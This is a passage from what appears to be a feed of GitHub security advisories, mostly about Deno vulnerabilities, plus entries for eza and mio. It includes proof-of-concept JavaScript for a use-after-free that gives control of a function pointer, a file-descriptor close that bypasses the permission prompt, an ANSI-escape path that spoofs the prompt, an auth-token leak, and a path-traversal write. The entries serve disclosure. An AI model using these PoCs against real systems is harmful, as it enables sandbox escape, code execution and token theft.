<p><code>*const c_void</code> is trivially unsafe. <code>ExternalPointer</code> attempts to resolve this issue by wrapping the underlying pointer with a <code>usize</code>d marker (<a href="https://github.com/denoland/deno_core/blob/a2838062a8f51926140a48a8aa926330c6f9070c/core/external.rs#L49"><code>ExternalWithMarker&lt;T&gt;</code></a>).</p>
<p>However, the marker <a href="https://github.com/denoland/deno_core/blob/a2838062a8f51926140a48a8aa926330c6f9070c/core/external.rs#L10">relies on the randomness of PIE address (binary base address)</a> which is still trivially exploitable for a non-PIE binary. It is also equally exploitable on a PIE binary when an attacker is able to derandomize the PIE address. This is problematic as it escalates an information leak of the PIE address into an exploitable vulnerability.</p>
<p>Note that an attacker able to control code executed inside the Deno runtime is very likely to be able to bypass ASLR with any means necessary (e.g. by chaining another vulnerability, or by using other granted permissions such as <code>--allow-read</code> to read <code>/proc/self/maps</code>).</p>
<h3 id="poc">PoC</h3>
<p>For simplicity, we use Deno version 1.38.0 where streaming operations uses <code>*const c_void</code>. Testing environment is Docker image <code>denoland/deno:alpine-1.38.0@sha256:fe51a00f4fbbaf1e72b29667c3eeeda429160cef2342f22a92c3820020d41f38</code> although the exact versions shouldn't matter much if it's in 1.36.2 up to 1.38.0 (before <code>ExternalPointer</code> patch, refer Impact section for details)</p>
<pre><code class="language-js">const ops = Deno[Deno.internal].core.ops;
const rid = ops.op_readable_stream_resource_allocate();
const sink = ops.op_readable_stream_resource_get_sink(rid);

// close
ops.op_readable_stream_resource_close(sink);
ops.op_readable_stream_resource_close(sink);

// reclaim BoundedBufferChannelInner
const ab = new ArrayBuffer(0x8058);
const dv = new DataView(ab);

// forge chunk contents
dv.setBigUint64(0, 2n, true);
dv.setBigUint64(0x8030, 0x1337c0d30000n, true);

// trigger segfault
Deno.close(rid);
</code></pre>
<p>Below is the dmesg log after the crash. We see that Deno has segfaulted on <code>1337c0d30008</code>, which is +8 of what we have written at offset 0x8030. Note also that the dereferenced value will immediately be used as a function pointer, with the first argument dereferenced from offset 0x8038 - it is trivial to use this to build an end-to-end exploit.</p>
<pre><code class="language-text">[ 6439.821046] deno[15088]: segfault at 1337c0d30008 ip 0000557b53e2fb3e sp 00007fffd485ac70 error 4 in deno[557b51714000+2d7f000] likely on CPU 12 (core 12, socket 0)
[ 6439.821054] Code: 00 00 00 00 48 85 c0 74 03 ff 50 08 49 8b 86 30 80 00 00 49 8b be 38 80 00 00 49 c7 86 30 80 00 00 00 00 00 00 48 85 c0 74 03 &lt;ff&gt; 50 08 48 ff 03 48 83 c4 08 5b 41 5e c3 48 8d 3d 0d 1a 59 fb 48
</code></pre>
<p>The same vulnerability exists for <code>ExternalPointer</code> implementation, but now it is required for the attacker to either leak the PIE address somehow, or else exploit unexpected aliasing behavior of <code>v8::External</code> values. The latter has not been investigated in depth, but it is theoretically possible to alias the same underlying pointer to different <code>v8::External</code> on different threads (Workers) and exploit the concurrency (<code>RefCell</code> may break this though).</p>
<h3 id="impact">Impact</h3>
<p>Use of inherently unsafe <code>*const c_void</code> and <code>ExternalPointer</code> leads to use-after-free access of the underlying structure, which is exploitable by an attacker controlling the code executed inside a Deno runtime to obtain arbitrary code execution on the host machine regardless of permissions.</p>
<p>This bug is <strong>known to be exploitable</strong> for both <code>*const c_void</code> and <code>ExternalPointer</code> implementations.</p>
<p>Affected versions of Deno is from 1.36.2 up to latest.</p>
<ul>
<li><a href="https://github.com/denoland/deno/blob/main/ext/web/stream_resource.rs">ext/web/stream_resource.rs</a>:<ul>
<li><code>*const c_void</code> introduced in 1.36.2</li>
<li>Patched into <code>ExternalPointer</code> in 1.38.1</li>
</ul>
</li>
<li><a href="https://github.com/denoland/deno/blob/main/ext/http/http_next.rs">ext/http/http_next.rs</a>:<ul>
<li><code>ExternalPointer</code> introduced in 1.38.2</li>
</ul>
</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-3j27-563v-28wf">https://github.com/denoland/deno/security/advisories/GHSA-3j27-563v-28wf</a></li>
<li><a href="https://github.com/advisories/GHSA-3j27-563v-28wf">https://github.com/advisories/GHSA-3j27-563v-28wf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3j27-563v-28wf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-06T17:04:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno] Deno arbitrary file descriptor close via `op_node_ipc_pipe()` leading to permission prompt bypass]]></title>
        <id>https://github.com/advisories/GHSA-6q4w-9x56-rmwq</id>
        <link href="https://github.com/advisories/GHSA-6q4w-9x56-rmwq"/>
        <updated>2024-03-21T18:29:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Use of raw file descriptors in <code>op_node_ipc_pipe()</code> leads to premature close of arbitrary file descriptors, allowing standard input to be re-opened as a different resource resulting in permission prompt bypass.</p>
<h3 id="details">Details</h3>
<p>Node child_process IPC relies on the JS side to pass the raw IPC file descriptor to <code>op_node_ipc_pipe()</code>, which returns a <code>IpcJsonStreamResource</code> ID associated with the file descriptor. On closing the resource, the raw file descriptor is closed together.</p>
<p>Although closing a file descriptor is seemingly a harmless task, this has been known to be exploitable:</p>
<ul>
<li>With <code>--allow-read</code> and <code>--allow-write</code> permissions, one can open <code>/dev/ptmx</code> as stdin. This device happily accepts TTY ioctls and pipes anything written into it back to the reader. <ul>
<li>This has been presented in a hacking competition (WACON 2023 Quals "dino jail").</li>
<li>However, the precondition of this challenge was heavily contrived: fd 0 has manually been closed by FFI and <code>setuid()</code> was used to drop permissions and deny access to <code>/proc</code> since global write permissions are usually equivalent to arbitrary code execution (<code>/proc/self/mem</code>).</li>
</ul>
</li>
</ul>
<p>As this vulnerability conveniently allows us to close stdin (fd 0) without any FFI, we can open any resource that when read returns <code>y</code>, <code>Y</code> or <code>A</code> as its first character (<a href="https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L265">runtimes/permissions/prompter.rs</a>) to bypass the prompt.</p>
<p>There is a caveat however - all stdio/stdin/stderr streams are <a href="https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L214">locked</a>, after which <a href="https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L220"><code>clear_stdin()</code></a> is called. This invokes <a href="https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L99"><code>libc::tcflush(0, libc::TCIFLUSH)</code></a> which fails on a non-TTY file descriptor.</p>
<p>This can be exploited by widening the race window between <code>clear_stdin()</code> and the next <a href="https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L256"><code>stdin_lock.read_line()</code></a>. Notably, the prompt message contains the requested resource name (path) which is filtered by <a href="https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L225"><code>strip_ansi_codes_and_ascii_control()</code></a>. This is also concatenated by <a href="https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L241"><code>write!()</code></a> to make a single buffer printed out to stderr. Thus, if we request a very long resource name, the window will widen allowing us to easily and stably race another Worker that closes fd 0 and opens a resource starting with an <code>A\n</code> within the race window.</p>
<p>Note that attacker does not need any permissions to exploit this bug to a full permission prompt bypass, as Cache API can be used to create and open files with controlled content without any permissions. Refer to the Impact section for more details.</p>
<h3 id="poc">PoC</h3>
<p>Testing environment is Docker image <code>denoland/deno:alpine-1.39.0@sha256:95064390f2c115673762bfc4fe15b1a7f81c859038b8c02b277ede7cd8a2ccbf</code>.</p>
<p>Below PoC closes stdout (fd 1) and then prints two lines, one on stdout and one on stderr. Only the latter line is shown as stdout file descriptor is closed.</p>
<pre><code class="language-js">const ops = Deno[Deno.internal].core.ops;

// open fd 1 as ipc stream resource
const rid = ops.op_node_ipc_pipe(1);

// close resource &amp; fd 1
Deno.close(rid);

// this should not be seen (stdout)
console.log('not seen');

// but this is seen (stderr)
console.error('seen');
</code></pre>
<p>Below is <code>/proc/$(pgrep deno)/fd</code> right after executing the last line of the above PoC. We see that fd 1 is indeed missing.</p>
<pre><code class="language-text">total 0
dr-x------ 2 root root 30 Dec 18 07:07 ./
dr-xr-xr-x 9 root root  0 Dec 18 07:07 ../
lrwx------ 1 root root 64 Dec 18 07:07 0 -&gt; /dev/pts/0
l-wx------ 1 root root 64 Dec 18 07:07 10 -&gt; 'pipe:[159305]'
lr-x------ 1 root root 64 Dec 18 07:07 11 -&gt; 'pipe:[159306]'
l-wx------ 1 root root 64 Dec 18 07:07 12 -&gt; 'pipe:[159306]'
lrwx------ 1 root root 64 Dec 18 07:07 13 -&gt; /deno-dir/dep_analysis_cache_v1
l-wx------ 1 root root 64 Dec 18 07:07 14 -&gt; 'pipe:[159305]'
l-wx------ 1 root root 64 Dec 18 07:07 15 -&gt; 'pipe:[159306]'
lrwx------ 1 root root 64 Dec 18 07:07 16 -&gt; /deno-dir/node_analysis_cache_v1
lrwx------ 1 root root 64 Dec 18 07:07 17 -&gt; /dev/pts/0
lrwx------ 1 root root 64 Dec 18 07:07 18 -&gt; /dev/pts/0
lrwx------ 1 root root 64 Dec 18 07:07 19 -&gt; /dev/pts/0
lrwx------ 1 root root 64 Dec 18 07:07 2 -&gt; /dev/pts/0
lrwx------ 1 root root 64 Dec 18 07:07 20 -&gt; 'anon_inode:[eventpoll]'
lrwx------ 1 root root 64 Dec 18 07:07 21 -&gt; 'anon_inode:[eventfd]'
lrwx------ 1 root root 64 Dec 18 07:07 22 -&gt; 'anon_inode:[eventpoll]'
lrwx------ 1 root root 64 Dec 18 07:07 23 -&gt; 'socket:[159302]'
lrwx------ 1 root root 64 Dec 18 07:07 24 -&gt; 'anon_inode:[eventpoll]'
lrwx------ 1 root root 64 Dec 18 07:07 25 -&gt; 'anon_inode:[eventfd]'
lrwx------ 1 root root 64 Dec 18 07:07 26 -&gt; 'anon_inode:[eventpoll]'
lrwx------ 1 root root 64 Dec 18 07:07 27 -&gt; 'socket:[159302]'
lrwx------ 1 root root 64 Dec 18 07:07 28 -&gt; 'socket:[159310]'
lrwx------ 1 root root 64 Dec 18 07:07 29 -&gt; 'socket:[159308]'
lrwx------ 1 root root 64 Dec 18 07:07 3 -&gt; 'anon_inode:[eventpoll]'
lrwx------ 1 root root 64 Dec 18 07:07 30 -&gt; 'socket:[159309]'
lrwx------ 1 root root 64 Dec 18 07:07 4 -&gt; 'anon_inode:[eventfd]'
lrwx------ 1 root root 64 Dec 18 07:07 5 -&gt; 'anon_inode:[eventpoll]'
lrwx------ 1 root root 64 Dec 18 07:07 6 -&gt; 'socket:[159302]'
lrwx------ 1 root root 64 Dec 18 07:07 7 -&gt; 'socket:[159303]'
lrwx------ 1 root root 64 Dec 18 07:07 8 -&gt; 'socket:[159302]'
lr-x------ 1 root root 64 Dec 18 07:07 9 -&gt; 'pipe:[159305]'
</code></pre>
<h3 id="impact">Impact</h3>
<p>Use of raw file descriptors in <code>op_node_ipc_pipe()</code> leads to premature close of arbitrary file descriptors. This allow standard input (fd 0) to be closed and re-opened for a different resource, which allows a silent permission prompt bypass. This is exploitable by an attacker controlling the code executed inside a Deno runtime to obtain arbitrary code execution on the host machine regardless of permissions.</p>
<p>This bug is <strong>known to be exploitable</strong> - there is a working exploit that achieves arbitrary code execution by bypassing prompts from zero permissions, additionally abusing the fact that Cache API lacks filesystem permission checks. The attack can be conducted silently as stderr can also be closed, suppressing all prompt outputs.</p>
<blockquote>
<p>Note that Deno's security model is currently described as follows:</p>
<ul>
<li>All runtime I/O is considered to be privileged and must always be guarded by a runtime permission. This includes filesystem access, network access, etc.<ul>
<li>The only exception to this is runtime storage explosion attacks that are isolated to a part of the file system, caused by evaluated code (for example, caching big dependencies or no limits on runtime caches such as the Web Cache API).</li>
</ul>
</li>
</ul>
<p>Although it is ambiguous if the fundamental lack of file system permission checks on Web Cache API is a vulnerability or not, the reporter have not reported this as a vulnerability assuming that this is a known risk (or a feature).</p>
</blockquote>
<p>Affected version of Deno is 1.39.0.</p>
<ul>
<li>Introduced with commit 5a91a06</li>
<li>Fixed with commit 55fac9f</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-6q4w-9x56-rmwq">https://github.com/denoland/deno/security/advisories/GHSA-6q4w-9x56-rmwq</a></li>
<li><a href="https://github.com/denoland/deno/commit/55fac9f5ead6d30996400e8597c969b675c5a22b">https://github.com/denoland/deno/commit/55fac9f5ead6d30996400e8597c969b675c5a22b</a></li>
<li><a href="https://github.com/denoland/deno/commit/5a91a065b882215dde209baf626247e54c21a392">https://github.com/denoland/deno/commit/5a91a065b882215dde209baf626247e54c21a392</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27933">https://nvd.nist.gov/vuln/detail/CVE-2024-27933</a></li>
<li><a href="https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L214">https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L214</a></li>
<li><a href="https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L220">https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L220</a></li>
<li><a href="https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L225">https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L225</a></li>
<li><a href="https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L241">https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L241</a></li>
<li><a href="https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L256">https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L256</a></li>
<li><a href="https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L265">https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L265</a></li>
<li><a href="https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L99">https://github.com/denoland/deno/blob/v1.39.0/runtime/permissions/prompter.rs#L99</a></li>
<li><a href="https://github.com/advisories/GHSA-6q4w-9x56-rmwq">https://github.com/advisories/GHSA-6q4w-9x56-rmwq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6q4w-9x56-rmwq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-06T17:04:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno] Deno's improper suffix match testing for DENO_AUTH_TOKENS]]></title>
        <id>https://github.com/advisories/GHSA-5frw-4rwq-xhcr</id>
        <link href="https://github.com/advisories/GHSA-5frw-4rwq-xhcr"/>
        <updated>2024-03-21T18:25:43.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Deno improperly checks that an import specifier's hostname is equal to or a child of a token's hostname, which can cause tokens to be sent to servers they shouldn't be sent to. An auth token intended for <code>example.com</code> may be sent to <code>notexample.com</code>.</p>
<h3 id="details">Details</h3>
<p><a href="https://github.com/denoland/deno/blob/3f4639c330a31741b0efda2f93ebbb833f4f95bc/cli/auth_tokens.rs#L89">auth_tokens.rs uses a simple ends_with check</a>, which matches <code>www.deno.land</code> to a <code>deno.land</code> token as intended, but also matches <code>im-in-ur-servers-attacking-ur-deno.land</code> to <code>deno.land</code> tokens.</p>
<h3 id="poc">PoC</h3>
<ul>
<li>Set up a server that logs requests. RequestBin will do. For example, <code>denovulnpoc.example.com</code>.</li>
<li>Run <code>DENO_AUTH_TOKENS=a1b2c3d4e5f6@left-truncated.domain deno run https://not-a-left-truncated.domain</code>. For example, <code>DENO_AUTH_TOKENS=a1b2c3d4e5f6@poc.example.com deno run https://denovulnpoc.example.com</code></li>
<li>Observe that the token intended only for the truncated domain is sent to the full domain</li>
</ul>
<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em>
Anyone who uses DENO_AUTH_TOKENS and imports potentially untrusted code is affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-5frw-4rwq-xhcr">https://github.com/denoland/deno/security/advisories/GHSA-5frw-4rwq-xhcr</a></li>
<li><a href="https://github.com/denoland/deno/commit/de23e3b60b066481cc390f459497d5bef42a899b">https://github.com/denoland/deno/commit/de23e3b60b066481cc390f459497d5bef42a899b</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27932">https://nvd.nist.gov/vuln/detail/CVE-2024-27932</a></li>
<li><a href="https://github.com/denoland/deno/blob/3f4639c330a31741b0efda2f93ebbb833f4f95bc/cli/auth_tokens.rs#L89">https://github.com/denoland/deno/blob/3f4639c330a31741b0efda2f93ebbb833f4f95bc/cli/auth_tokens.rs#L89</a></li>
<li><a href="https://github.com/advisories/GHSA-5frw-4rwq-xhcr">https://github.com/advisories/GHSA-5frw-4rwq-xhcr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5frw-4rwq-xhcr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-06T17:03:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[eza] Duplicate Advisory: eza Potential Heap Overflow Vulnerability for AArch64]]></title>
        <id>https://github.com/advisories/GHSA-3xc6-7h59-j2x4</id>
        <link href="https://github.com/advisories/GHSA-3xc6-7h59-j2x4"/>
        <updated>2024-03-06T15:34:12.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-3qx3-6hxr-j2ch. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>Buffer Overflow vulnerability in eza before version 0.18.2, allows local attackers to execute arbitrary code via the .git/HEAD, .git/refs, and .git/objects components.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-25817">https://nvd.nist.gov/vuln/detail/CVE-2024-25817</a></li>
<li><a href="https://github.com/advisories/GHSA-3qx3-6hxr-j2ch">https://github.com/advisories/GHSA-3qx3-6hxr-j2ch</a></li>
<li><a href="https://www.cubeyond.net/blog/my-cves/eza-cve-report">https://www.cubeyond.net/blog/my-cves/eza-cve-report</a></li>
<li><a href="https://github.com/advisories/GHSA-3xc6-7h59-j2x4">https://github.com/advisories/GHSA-3xc6-7h59-j2x4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3xc6-7h59-j2x4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-06T00:31:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno_runtime] Deno's deno_runtime vulnerable to interactive permission prompt spoofing via improper ANSI stripping]]></title>
        <id>https://github.com/advisories/GHSA-m4pq-fv2w-6hrw</id>
        <link href="https://github.com/advisories/GHSA-m4pq-fv2w-6hrw"/>
        <updated>2024-03-21T18:29:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A maliciously crafted permission request can show the spoofed permission prompt by inserting a broken ANSI escape sequence into the request contents.</p>
<h3 id="details">Details</h3>
<p>In <a href="https://github.com/denoland/deno/commit/78d430103a8f6931154ddbbe19d36f3b8630286d">the patch for CVE-2023-28446</a>, Deno is stripping any ANSI escape sequences from the permission prompt, but permissions given to the program are based on the contents that contain the ANSI escape sequences.</p>
<p>For example, requesting the read permission with <code>/tmp/hello\u001b[/../../etc/hosts</code> as a path will display the <code>/tmp/hellotc/hosts</code> in the permission prompt, but the actual permission given to the program is <code>/tmp/hello\u001b[/../../etc/hosts</code>, which is <code>/etc/hosts</code> after the normalization.</p>
<p>This difference allows a malicious Deno program to spoof the contents of the permission prompt.</p>
<h3 id="poc">PoC</h3>
<p>Run the following JavaScript and observe that <code>/tmp/hellotc/hosts</code> is displayed in the permission prompt instead of <code>/etc/hosts</code>, although Deno gives access to <code>/etc/hosts</code>.</p>
<pre><code class="language-javascript">const permission = { name: "read", path: "/tmp/hello\u001b[/../../etc/hosts" };
await Deno.permissions.request(permission);
console.log(await Deno.readTextFile("/etc/hosts"));
</code></pre>
<h4 id="expected-prompt">Expected prompt</h4>
<pre><code>┌ ⚠️  Deno requests read access to "/etc/hosts".
├ Requested by `Deno.permissions.query()` API
├ Run again with --allow-read to bypass this prompt.
└ Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all read permissions) &gt;
</code></pre>
<h4 id="actual-prompt">Actual prompt</h4>
<pre><code>┌ ⚠️  Deno requests read access to "/tmp/hellotc/hosts".
├ Requested by `Deno.permissions.query()` API
├ Run again with --allow-read to bypass this prompt.
└ Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all read permissions) &gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>Any Deno program can spoof the content of the interactive permission prompt by inserting a broken ANSI code, which allows a malicious Deno program to display the wrong file path or program name to the user.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-m4pq-fv2w-6hrw">https://github.com/denoland/deno/security/advisories/GHSA-m4pq-fv2w-6hrw</a></li>
<li><a href="https://github.com/denoland/deno/commit/78d430103a8f6931154ddbbe19d36f3b8630286d">https://github.com/denoland/deno/commit/78d430103a8f6931154ddbbe19d36f3b8630286d</a></li>
<li><a href="https://github.com/denoland/deno/commit/7e6b94231290020b55f1d08fb03ea8132781abc5">https://github.com/denoland/deno/commit/7e6b94231290020b55f1d08fb03ea8132781abc5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27936">https://nvd.nist.gov/vuln/detail/CVE-2024-27936</a></li>
<li><a href="https://github.com/advisories/GHSA-m4pq-fv2w-6hrw">https://github.com/advisories/GHSA-m4pq-fv2w-6hrw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m4pq-fv2w-6hrw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-05T20:54:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno] Deno's Node.js Compatibility Runtime has Cross-Session Data Contamination]]></title>
        <id>https://github.com/advisories/GHSA-wrqv-pf6j-mqjp</id>
        <link href="https://github.com/advisories/GHSA-wrqv-pf6j-mqjp"/>
        <updated>2024-03-21T18:29:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A vulnerability in Deno's Node.js compatibility runtime allows for cross-session data contamination during simultaneous asynchronous reads from Node.js streams sourced from sockets or files. The issue arises from the re-use of a global buffer (BUF) in stream_wrap.ts used as a performance optimization to limit allocations during these asynchronous read operations. This can lead to data intended for one session being received by another session, potentially resulting in data corruption and unexpected behavior.</p>
<h3 id="details">Details</h3>
<p>A bug in Deno's Node.js compatibility runtime results in data cross-reception during simultaneous asynchronous reads from Node.js network streams. When multiple independent network socket connections are involved, this vulnerability can be triggered. For instance, two separate server sockets that receive data from their respective client sockets and then echo the received data back to the client using Node.js streams may experience an issue where data from one socket may appear on another socket. Due to the improper isolation of the global buffer (<code>BUF</code>), data sent by one socket can end up being incorrectly received by another socket. Consequently, data intended for one session may be exposed to another session, potentially leading to data corruption and unexpected behavior.</p>
<p>This buffer was introduced as a performance optimization to avoid excessive allocations during network read operations.</p>
<p>In cases where the <a href="https://nodejs.org/api/net.html">net.Stream</a> is connected to a remote server such as a database or key/value store such as Redis, this may result in a packet received on one connection being presented to another, causing data cross-contamination between multiple users and potentially leaking sensitive information.</p>
<p>It is important to note that this vulnerability does not affect Deno network streams created with the <code>Deno.listen</code> and <code>Deno.connect</code> APIs. </p>
<p>The impact of this issue may extend beyond node.js network streams, however, and may also affect asynchronous reads from non-network node.js Stream such as those created from files.</p>
<h3 id="poc">PoC</h3>
<p><a href="https://github.com/denoland/deno/issues/20188">https://github.com/denoland/deno/issues/20188</a></p>
<h3 id="impact">Impact</h3>
<p>This affects all users of Deno that use the node.js compatibility layer for network communication or other streams, including packages that may require node.js libraries indirectly.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-wrqv-pf6j-mqjp">https://github.com/denoland/deno/security/advisories/GHSA-wrqv-pf6j-mqjp</a></li>
<li><a href="https://github.com/denoland/deno/issues/20188">https://github.com/denoland/deno/issues/20188</a></li>
<li><a href="https://github.com/denoland/deno/commit/3e9fb8aafd9834ebacd27734cea4310caaf794c6">https://github.com/denoland/deno/commit/3e9fb8aafd9834ebacd27734cea4310caaf794c6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27935">https://nvd.nist.gov/vuln/detail/CVE-2024-27935</a></li>
<li><a href="https://github.com/advisories/GHSA-wrqv-pf6j-mqjp">https://github.com/advisories/GHSA-wrqv-pf6j-mqjp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wrqv-pf6j-mqjp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-05T20:49:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno] Insufficient permission checking in `Deno.makeTemp*` APIs]]></title>
        <id>https://github.com/advisories/GHSA-hrqr-jv8w-v9jh</id>
        <link href="https://github.com/advisories/GHSA-hrqr-jv8w-v9jh"/>
        <updated>2024-03-05T20:30:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Insufficient validation of parameters in <code>Deno.makeTemp*</code> APIs would allow for creation of files outside of the allowed directories. This may allow the user to overwrite important files on the system that may affect other systems.</p>
<p>A user may provide a prefix or suffix to a <code>Deno.makeTemp*</code> API containing path traversal characters. The permission check would prompt for the base directory of the API, but the final file that was created would be outside of this directory:</p>
<pre><code>$ mkdir /tmp/good
$ mkdir /tmp/bad
$ deno repl --allow-write=/tmp/good
&gt; Deno.makeTempFileSync({ dir: "/tmp/bad" })
┌ ⚠️  Deno requests write access to "/tmp/bad".
├ Requested by `Deno.makeTempFile()` API.
├ Run again with --allow-write to bypass this prompt.
└ Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all write permissions) &gt; n
❌ Denied write access to "/tmp/bad".
Uncaught PermissionDenied: Requires write access to "/tmp/bad", run again with the --allow-write flag
    at Object.makeTempFileSync (ext:deno_fs/30_fs.js:176:10)
    at &lt;anonymous&gt;:1:27
&gt; Deno.makeTempFileSync({ dir: "/tmp/good", prefix: "../bad/" })
"/tmp/good/../bad/a9432ef5"
$ ls -l /tmp/bad/a9432ef5
-rw-------@ 1 user  group  0 Mar  4 09:20 /tmp/bad/a9432ef5
</code></pre>
<h3 id="patches">Patches</h3>
<p>This is fixed in Deno 1.41.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-hrqr-jv8w-v9jh">https://github.com/denoland/deno/security/advisories/GHSA-hrqr-jv8w-v9jh</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27931">https://nvd.nist.gov/vuln/detail/CVE-2024-27931</a></li>
<li><a href="https://github.com/advisories/GHSA-hrqr-jv8w-v9jh">https://github.com/advisories/GHSA-hrqr-jv8w-v9jh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hrqr-jv8w-v9jh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-05T16:19:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mio] Mio's tokens for named pipes may be delivered after deregistration]]></title>
        <id>https://github.com/advisories/GHSA-r8w9-5wcg-vfj7</id>
        <link href="https://github.com/advisories/GHSA-r8w9-5wcg-vfj7"/>
        <updated>2024-03-06T21:37:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When using named pipes on Windows, mio will under some circumstances return invalid tokens that correspond to named pipes that have already been deregistered from the mio registry. The impact of this vulnerability depends on how mio is used. For some applications, invalid tokens may be ignored or cause a warning or a crash. On the other hand, for applications that store pointers in the tokens, this vulnerability may result in a use-after-free.</p>
<p>For users of Tokio, this vulnerability is serious and can result in a use-after-free in Tokio.</p>
<p>The vulnerability is Windows-specific, and can only happen if you are using named pipes. Other IO resources are not affected.</p>
<h3 id="affected-versions">Affected versions</h3>
<p>This vulnerability has been fixed in mio v0.8.11.</p>
<p>All versions of mio between v0.7.2 and v0.8.10 are vulnerable.</p>
<p>Tokio is vulnerable when you are using a vulnerable version of mio AND you are using at least Tokio v1.30.0. Versions of Tokio prior to v1.30.0 will ignore invalid tokens, so they are not vulnerable.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Vulnerable libraries that use mio can work around this issue by detecting and ignoring invalid tokens.</p>
<h3 id="technical-details">Technical details</h3>
<p>When an IO resource registered with mio has a readiness event, mio delivers that readiness event to the user using a user-specified token. Mio guarantees that when an IO resource is <a href="https://docs.rs/mio/latest/mio/struct.Registry.html#method.deregister">deregistered</a>, then it will never return the token for that IO resource again. However, for named pipes on windows, mio may sometimes deliver the token for a named pipe even though the named pipe has been previously deregistered.</p>
<p>This vulnerability was originally reported in the Tokio issue tracker: <a href="https://github.com/tokio-rs/tokio/issues/6369">tokio-rs/tokio#6369</a>
This vulnerability was fixed in: <a href="https://github.com/tokio-rs/mio/pull/1760">tokio-rs/mio#1760</a>
